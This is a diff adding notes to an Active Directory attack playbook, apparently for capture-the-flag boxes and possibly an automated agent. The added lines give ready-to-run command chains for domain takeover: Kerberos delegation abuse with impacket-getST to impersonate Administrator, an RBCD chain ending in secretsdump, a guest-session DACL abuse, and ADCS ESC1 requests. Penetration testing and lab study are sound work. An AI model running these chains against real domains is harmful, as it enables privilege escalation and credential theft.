@@ -91,12 +91,24 @@ hashcat -m 18200 asrep.txt rockyou.txt;  hashcat -m 13100 tgs.txt rockyou.txt
 nxc ldap <dc> -u <user> -p <pass> --bloodhound -c all --dns-server <dc>
 # GenericWrite/WriteDACL/GenericAll -> shadow creds (certipy shadow auto), targeted Kerberoast, group add
 ```
+   - **A ForceChangePassword/control chain that "dead-ends" is a BloodHound-ACL blind spot, NOT a
+     dead end. Re-enumerate the ATTRIBUTES of every account you gain, especially the terminal one.**
+     The winning primitive is frequently an account PROPERTY the ACL graph does not surface as an
+     outbound edge: **constrained delegation** (`msDS-AllowedToDelegateTo`), an SPN (Kerberoastable /
+     RBCD `-delegate-from`), a DCSync right, `AdminCount`, or membership that grants it. When a reset
+     daisy-chain (TABATHA->SHAWNA->CRUZ->DARLA) loops or stops, run on the LAST user you own:
+     `nxc ldap <dc> -u <user> -p <pass> --find-delegation` (constrained/unconstrained/RBCD in one
+     shot), `impacket-GetUserSPNs` (SPN), and re-check its group memberships. Do NOT conclude "no
+     path to DA" off the ACL edges alone (real: a whole box's DA leg was `Constrained w/ Protocol
+     Transition` on the chain's terminal user, invisible as an ACL edge; chasing the ACL-controlled
+     accounts instead burned the run).
 5. **ADCS (run on every engagement):**
 ```bash
 certipy find -u <user>@<domain> -p <pass> -dc-ip <dc> -vulnerable -stdout    # ESC1-16
 certipy req -u <user>@<domain> -p <pass> -ca <ca> -template <vuln> -upn administrator@<domain>   # ESC1
 ```
 6. **Delegation:** unconstrained (TGT capture via printerbug/coerce), constrained (`-impersonate`), RBCD (`ms-DS-AllowedToActOnBehalfOfOtherIdentity` write).
+   - **Constrained delegation W/ PROTOCOL TRANSITION on a USER you control = instant impersonation of ANY user to that SPN** (no computer/RBCD needed): `--find-delegation` shows `Constrained w/ Protocol Transition` + the `DelegationRightsTo` SPN (e.g. `cifs/DC.dom`). Then `impacket-getST -spn cifs/DC.<dom> -impersonate Administrator -dc-ip <dc> '<dom>/<user>:<pass>'` -> `KRB5CCNAME=Administrator@...ccache impacket-smbclient -k -no-pass DC.<dom>` reads `C$\Users\Administrator\Desktop\root.txt` directly (no exec, AV-safe). Sync clock first (`ntpdate <dc>`) or getST throws `KRB_AP_ERR_SKEW`; add the DC FQDN to `/etc/hosts`. This is the whole DA leg when a reset-chain's terminal user holds it.
    - **RBCD -> DA chain** (own an account with `AddAllowedToAct`/`GenericWrite` on a computer + MAQ>0): `impacket-addcomputer <dom>/<u>:<p> -computer-name 'FAKE$' -computer-pass <pw> -dc-ip <dc>` -> `impacket-rbcd <dom>/<u>:<p> -delegate-to 'DC01$' -delegate-from 'FAKE$' -action write -dc-ip <dc>` -> `impacket-getST <dom>/'FAKE$':<pw> -spn cifs/DC01.<dom> -impersonate Administrator -dc-ip <dc>` -> `KRB5CCNAME=<ccache> impacket-secretsdump -k -no-pass DC01.<dom> -just-dc-user Administrator`. Sync clock if getST throws `KRB_AP_ERR_SKEW`. The account with the write is often obtained by **password reuse from an on-box cred store** (step 7), not an ACL edge from your foothold.
    - **MAQ=0 does NOT block RBCD.** You only need a machine account if you have none; ANY account you control with an SPN (a Kerberoastable user) is a valid `-delegate-from`. Cracked a Kerberoastable user? Reuse it, skip `addcomputer`. And the write can come from a low-priv principal: a DACL granting `BUILTIN\Guests` GenericWrite over the DC computer object is exploitable straight from a guest/null session (`-hashes :31d6cfe0d16ae931b73c59d7e0c089c0` = empty-pw NT hash, since impacket prompts on a TTY-less run). See [[kerberos-attacks]].
 7. **Credential access / DCSync:**
